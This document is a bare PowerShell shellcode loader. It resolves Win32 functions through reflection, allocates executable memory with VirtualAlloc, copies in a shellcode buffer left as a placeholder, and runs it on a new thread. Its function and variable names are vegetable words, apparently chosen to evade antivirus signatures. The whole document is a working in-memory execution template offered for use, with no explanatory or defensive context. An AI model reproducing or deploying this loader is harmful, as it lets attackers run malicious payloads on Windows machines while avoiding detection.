function potatoes {
Param ($cherries, $pineapple)
$tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
$turnips=@()
$tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
}
function apples {
Param (
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
return $type.CreateType()
}
$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Byte[]] $buf = <insert shellcode here>
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
$parsnips =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)
